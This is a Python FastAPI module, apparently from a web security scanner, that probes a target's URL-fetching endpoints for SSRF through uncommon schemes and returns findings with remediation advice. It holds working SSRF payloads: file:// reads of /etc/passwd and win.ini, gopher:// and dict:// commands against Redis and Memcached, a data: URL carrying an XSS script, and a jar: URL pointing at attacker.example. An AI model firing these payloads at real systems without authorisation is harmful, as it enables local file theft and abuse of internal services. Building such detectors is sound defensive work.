"""ssrf_url_schema_smuggle — SSRF via uncommon URL schemes.

If app fetches a user-supplied URL (preview, screenshot, OAuth callback,
import URL), attacker swaps scheme:
  - file:///etc/passwd → read local files
  - gopher://internal:6379 → Redis abuse
  - dict://internal:11211 → Memcached commands
  - ftp://internal — exfil via active FTP
  - data: URLs — embed binary attack payloads

Tests by injecting these schemes into common URL params.
"""
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
from tools._vl_core.turbo import vl_turbo
from tools._vl_core.verify import vl_verify

router = APIRouter()

PROBE_PATHS = [
    "/api/preview", "/api/fetch", "/api/proxy",
    "/api/import", "/api/url", "/api/screenshot",
    "/webhooks/url", "/oauth/callback?redirect_uri=",
    "/api/og-image?url=",
]

EVIL_SCHEMES = [
    ("file:///etc/passwd",         "/etc/passwd read"),
    ("file:///c:/windows/win.ini", "Windows file read"),
    ("gopher://localhost:6379/_INFO%0d%0a", "Redis via gopher"),
    ("dict://localhost:11211/stats", "Memcached via dict"),
    ("ftp://internal-host/",       "FTP internal scan"),
    ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                                    "data:URL XSS payload"),
    ("jar:http://attacker.example/!/", "jar protocol RCE (legacy Java)"),
]


def _probe(url, params, req):
    return safe_request("GET", url, params=params,
        headers={"User-Agent": "VulnusLab/1.0"},
        req=req, timeout=10, allow_redirects=False)


@router.post("/api/webapp/scan/ssrf_url_schema_smuggle")
@vl_turbo()
@vl_verify()
def scan_ssrf_url_schema_smuggle(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")
    # VL-TURBO deep: parallelize all (path, scheme) probes via thread pool.
    # Was 9 paths * 7 schemes = 63 sequential GETs * 10s = ~630s.
    # Now ~15s in pool(20). First-hit-per-path preserved by post-grouping.
    SIGNAL_MAP = {
        "/etc/passwd read":      ["root:x:", "root:!", "bin/bash"],
        "Windows file read":     ["[fonts]", "[mci extensions]"],
        "Redis via gopher":      ["redis_version:"],
        "Memcached via dict":    ["STAT pid", "STAT version"],
        "FTP internal scan":     ["220 ", "ftp", "220-Welcome"],
        "data:URL XSS payload":  ["<script>alert(1)</script>"],
        "jar protocol RCE (legacy Java)": ["jar://", "ClassNotFound"],
    }
    jobs = [(path, scheme, desc) for path in PROBE_PATHS
                                  for scheme, desc in EVIL_SCHEMES]

    def _probe_job(job):
        path, scheme, desc = job
        url = base + path
        if path.endswith("="):
            full_url = url + quote(scheme, safe="")
            r = safe_request("GET", full_url,
                headers={"User-Agent": "VulnusLab/1.0"},
                req=req, timeout=10, allow_redirects=False)
        else:
            r = _probe(url, {"url": scheme}, req)
        if r is None:
            return None
        body = (r.text or "")[:50000]
        indicators = SIGNAL_MAP.get(desc, [])
        for ind in indicators:
            if ind.lower() in body.lower():
                return ("hit", path, scheme, desc, ind, r.status_code)
        return ("miss", path, None, None, None, None)

    hits = []
    tested = 0
    raw_results = []
    if jobs:
        with ThreadPoolExecutor(max_workers=min(20, len(jobs))) as pool:
            for res in pool.map(_probe_job, jobs, timeout=45):
                if res is None:
                    continue
                raw_results.append(res)
                tested += 1

    seen_paths = set()
    for res in raw_results:
        verdict, path, scheme, desc, ind, status = res
        if verdict != "hit" or path in seen_paths:
            continue
        seen_paths.add(path)
        hits.append({"path": path, "scheme": scheme[:60],
                       "desc": desc, "indicator": ind, "status": status})

    findings = []
    if hits:
        critical_schemes = [h for h in hits if h["desc"] in
                             ("/etc/passwd read", "Windows file read",
                              "Redis via gopher", "jar protocol RCE (legacy Java)")]
        if critical_schemes:
            findings.append(wrap_finding(
                f"CRITICAL SSRF via URL schemes at {len(critical_schemes)} location(s)",
                "CRITICAL", cvss="9.8", cwe="CWE-918", owasp="A10:2021",
                remediation="(1) Whitelist URL schemes: ONLY http/https. Reject "
                            "file://, gopher://, dict://, ftp://, jar://, data:, "
                            "javascript:, php:, expect:, ws:, wss:, etc. "
                            "(2) Resolve hostname FIRST + block private CIDRs "
                            "(10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, "
                            "169.254.0.0/16). (3) Disable URL libraries that follow "
                            "redirects to other schemes (libcurl --proto -all,+http,+https).",
                evidence_marker=" | ".join(
                    f"{h['path']}: {h['desc']} → indicator '{h['indicator']}'"
                    for h in critical_schemes[:3]
                )))
        else:
            findings.append(wrap_finding(
                f"SSRF via URL schemes ({len(hits)} hit(s))",
                "HIGH", cvss="7.5", cwe="CWE-918", owasp="A10:2021",
                remediation="Whitelist URL schemes + block private CIDRs.",
                evidence_marker=" | ".join(
                    f"{h['path']}: {h['desc']}" for h in hits[:5]
                )))
    elif tested > 0:
        findings.append(wrap_finding(
            f"No SSRF via URL schemes ({tested} probes)",
            "POSITIVE", cwe="CWE-918",
            remediation="Maintain. Test deeper with Burp Collaborator for "
                        "out-of-band SSRF detection.",
            evidence_marker=f"{tested} probes across {len(PROBE_PATHS)} paths × "
                              f"{len(EVIL_SCHEMES)} schemes"))
    else:
        return standard_response(
            tool="ssrf_url_schema_smuggle", target=req.target, findings=[],
            tests_performed=0, vulnerable=False,
            skipped_reason="No URL-fetch endpoints found")

    return standard_response(
        tool="ssrf_url_schema_smuggle", target=req.target, findings=findings,
        tests_performed=tested, vulnerable=bool(hits),
        tests_summary=f"{tested} probes, {len(hits)} SSRF hits",
        raw_data={"hits": hits})


def register(app):
    app.include_router(router)
